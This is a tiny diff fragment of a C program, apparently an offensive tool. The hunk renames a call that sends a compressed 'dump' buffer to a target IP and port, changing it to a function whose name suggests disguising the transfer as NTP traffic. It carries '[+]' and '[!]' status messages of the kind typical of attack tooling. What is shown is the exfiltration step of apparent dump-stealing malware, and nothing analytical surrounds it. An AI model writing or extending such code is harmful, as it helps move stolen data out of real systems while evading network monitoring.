@@ -300,7 +300,7 @@ int main(void) {
     }
     printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);
 
-    if (SendCompressedDumpAsNT(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
+    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
         printf("[!] Failed to send compressed dump to receiver.\n");
         free(compressedBuffer);
         return 1;
